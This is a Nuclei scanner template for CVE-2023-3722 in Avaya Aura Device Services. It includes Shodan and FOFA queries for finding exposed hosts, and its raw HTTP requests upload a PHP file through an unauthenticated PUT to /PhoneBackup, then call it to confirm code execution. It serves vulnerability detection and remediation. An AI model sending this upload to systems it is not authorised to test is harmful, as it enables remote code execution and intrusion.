id: CVE-2023-3722

info:
  name: Avaya Aura Device Services - OS Command Injection
  author: iamnoooob,pdresearch
  severity: high
  description: |
    An OS command injection vulnerability was found in the Avaya Aura Device Services Web application which could allow remote code execution as the Web server user via a malicious uploaded file. This issue affects Avaya Aura Device Services version 8.1.4.0 and earlier.
  impact: |
    Unauthenticated attackers can upload malicious PHP files to execute arbitrary code with web server privileges on Avaya Aura Device Services, potentially compromising VoIP infrastructure and accessing telecommunications data.
  remediation: |
    Update Avaya Aura Device Services to a version newer than 8.1.4.0 that validates uploaded files and restricts code execution in the PhoneBackup directory.
  reference:
    - https://github.com/pizza-power/CVE-2023-3722
    - https://download.avaya.com/css/public/documents/101076366
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H
    cvss-score: 8.6
    cve-id: CVE-2023-3722
    cwe-id: CWE-434
    epss-score: 0.50868
    epss-percentile: 0.97772
    cpe: cpe:2.3:a:avaya:aura_device_services:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: avaya
    product: aura_device_services
    shodan-query: html:"Avaya Aura&reg;&nbsp;Utility Services"
    fofa-query: body="Avaya Aura&reg;&nbsp;Utility Services"
  tags: cve,cve2023,avaya,rce,upload,deviceservices,intrusive,vkev,vuln

variables:
  filename: "{{randbase(8)}}"
  marker: "{{randstr}}"

http:
  - raw:
      - |
        PUT /PhoneBackup/{{filename}}.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: AVAYA

        <?phP echo base64_decode($_GET['input']); ?>

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 201'
          - 'contains(body, "Resource /PhoneBackup/{{filename}}.php has been created.")'
        condition: and
        internal: true

  - raw:
      - |
        GET /PhoneBackup/{{filename}}.php?input={{base64(marker)}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: AVAYA

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "{{marker}}")'
        condition: and
# digest: 490a00463044022012da4add6ddad1f601549ac85f986d3fe2b7a5b5dddc8ef4f54bc61f96cf9bdf0220571225306488d3beb07a96343f66c99d57064718a2b14400f26126074fa4b61d:922c64590222798bb761d5b6d8e72950